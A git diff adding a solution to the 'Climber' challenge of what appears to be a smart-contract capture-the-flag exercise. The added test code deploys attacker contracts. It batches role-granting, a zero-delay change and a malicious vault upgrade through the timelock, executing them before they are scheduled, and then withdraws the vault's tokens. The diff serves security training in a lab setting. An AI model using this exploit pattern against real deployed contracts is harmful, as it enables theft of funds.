@@ -58,6 +58,39 @@ describe('[Challenge] Climber', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const VaultHackFactory = await ethers.getContractFactory('VaultHack', player);
+        const vaultHack = await VaultHackFactory.deploy();
+        console.log('vaultHack', vaultHack.address);
+
+        const ClimberHackFactory = await ethers.getContractFactory('ClimberHack', player);
+        const climberHack = await ClimberHackFactory.deploy(player.address, timelock.address, token.address, vault.address);
+        console.log('climberHack', climberHack.address);
+
+        // Execute a transaction to schedule
+        
+        // Make this contract a proposer
+        const proposerEncodedData = timelock.interface.encodeFunctionData('grantRole', [ethers.utils.id("PROPOSER_ROLE"), climberHack.address]);
+        // Update the delay to 0
+        const updateDelayEncodedData = timelock.interface.encodeFunctionData('updateDelay', [0]);
+        // Update the vault logic contract to VaultHack contract
+        const updateVaultLogicEncodedData = vault.interface.encodeFunctionData('upgradeTo', [vaultHack.address]);
+        // Call the exploit function
+        const exploitEncodedData = climberHack.interface.encodeFunctionData('exploit');
+
+        const targets = [timelock.address, timelock.address, vault.address, climberHack.address];
+        const values = Array(targets.length).fill(0);
+        const dataElements = [proposerEncodedData, updateDelayEncodedData, updateVaultLogicEncodedData, exploitEncodedData];
+        // Make salt a zero bytes32 field
+        const salt = ethers.utils.hexZeroPad(ethers.utils.hexlify(0), 32);
+        console.log("All the encoded data got till this point")
+
+        // const txn = await climberHack.exploit(targets, values, dataElements, salt);
+        await climberHack.saveScheduledData(targets, dataElements);
+
+        await timelock.connect(player).execute(targets, values, dataElements, salt);
+
+        await climberHack.withdraw();
+
     });
 
     after(async function () {
